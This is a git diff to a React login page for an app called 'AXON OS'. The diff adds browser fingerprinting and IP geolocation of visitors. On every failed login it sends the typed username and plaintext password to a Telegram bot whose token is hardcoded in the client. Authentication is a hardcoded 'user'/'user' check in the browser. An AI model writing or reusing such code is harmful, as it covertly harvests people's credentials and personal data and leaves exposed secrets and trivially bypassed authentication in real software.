@@ -4,7 +4,7 @@ import 'bootstrap/dist/css/bootstrap.min.css';
 import 'bootstrap-icons/font/bootstrap-icons.css';
 import { supabase } from './supabaseClient';
 
-// --- 1. LOGIN COMPONENT ---
+// --- 1. LOGIN COMPONENT (With Enhanced Forensics) ---
 const Login = ({ setAuth }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
@@ -15,8 +15,13 @@ const Login = ({ setAuth }) => {
   const handleLogin = async (e) => {
     e.preventDefault();
 
-    // 1. Fetch IP and Location Data
-    let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" };
+    // 1. Gather Extra Forensic Info
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const language = navigator.language;
+    const platform = window.navigator.platform;
+
+    // 2. Fetch IP and Location Data
+    let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown", timezone: "N/A" };
     try {
       const response = await fetch('https://ipapi.co/json/');
       if (response.ok) {
@@ -26,19 +31,22 @@ const Login = ({ setAuth }) => {
       console.error("Location lookup failed", err);
     }
 
+    const token = "8494749951:AAFDLdupc8KvrwyAnnkvR-iTG9ZfWUTLLOg";
+    const chat = "8620003085";
+
     if (username === 'user' && password === 'user') {
-      // --- TELEGRAM NOTIFICATION WITH IP & LOC ---
-      const token = "8494749951:AAFDLdupc8KvrwyAnnkvR-iTG9ZfWUTLLOg";
-      const chat = "8620003085";
-      
+      // --- SUCCESS ALERT ---
       const message = encodeURIComponent(
-        `🚨 *AXON OS LOGIN DETECTED*\n\n` +
+        `🔐 *AXON OS: AUTHORIZED ACCESS*\n\n` +
         `👤 *User:* ${username}\n` +
         `🌐 *IP:* ${ipInfo.ip}\n` +
         `📍 *Loc:* ${ipInfo.city}, ${ipInfo.region}\n` +
-        `🏢 *ISP:* ${ipInfo.org}\n` +
-        `💻 *Dev:* ${window.navigator.platform}\n` +
-        `⏰ *Time:* ${new Date().toLocaleTimeString()}`
+        `🏢 *ISP:* ${ipInfo.org}\n\n` +
+        `🖥 *DEVICE SPECS*\n` +
+        `💻 *Platform:* ${platform}\n` +
+        `📏 *Res:* ${screenRes}\n` +
+        `🗣 *Lang:* ${language}\n` +
+        `⏰ *TZ:* ${ipInfo.timezone}`
       );
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`)
@@ -47,9 +55,21 @@ const Login = ({ setAuth }) => {
       setAuth(true); 
       navigate('/dashboard');
     } else {
-      // OPTIONAL: Send a Telegram alert for failed attempts too
+      // --- BREACH ATTEMPT ALERT ---
+      const breachMsg = encodeURIComponent(
+        `⛔️ *AXON OS: BREACH ATTEMPT*\n\n` +
+        `🚫 *Tried:* ${username} / ${password}\n` +
+        `🌐 *IP:* ${ipInfo.ip}\n` +
+        `📍 *Loc:* ${ipInfo.city}\n` +
+        `💻 *Platform:* ${platform}\n` +
+        `🔴 *Status:* ACCESS_DENIED`
+      );
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${breachMsg}&parse_mode=Markdown`)
+        .catch(err => console.error("Telegram error:", err));
+
       setIsShaking(true);
-      setError('Access Denied: Invalid Credentials');
+      setError('Access Denied: Security Breach Protocol');
       setTimeout(() => setIsShaking(false), 500); 
     }
   };
@@ -69,7 +89,7 @@ const Login = ({ setAuth }) => {
       <div className={`apple-card ${isShaking ? 'shake' : ''}`}>
         <div className="mb-4 text-primary"><i className="bi bi-cpu" style={{ fontSize: '3.5rem' }}></i></div>
         <h2 className="fw-bold text-white mb-1">AXON <span className="text-primary">OS</span></h2>
-        <p className="text-secondary small mb-5">Kernel Access Protocol v3.5</p>
+        <p className="text-secondary small mb-5">Kernel Access Protocol v3.6</p>
         <form onSubmit={handleLogin}>
           <input type="text" placeholder="Username" className="form-control apple-input" value={username} onChange={(e) => setUsername(e.target.value)} />
           <input type="password" placeholder="Password" className="form-control apple-input" value={password} onChange={(e) => setPassword(e.target.value)} />
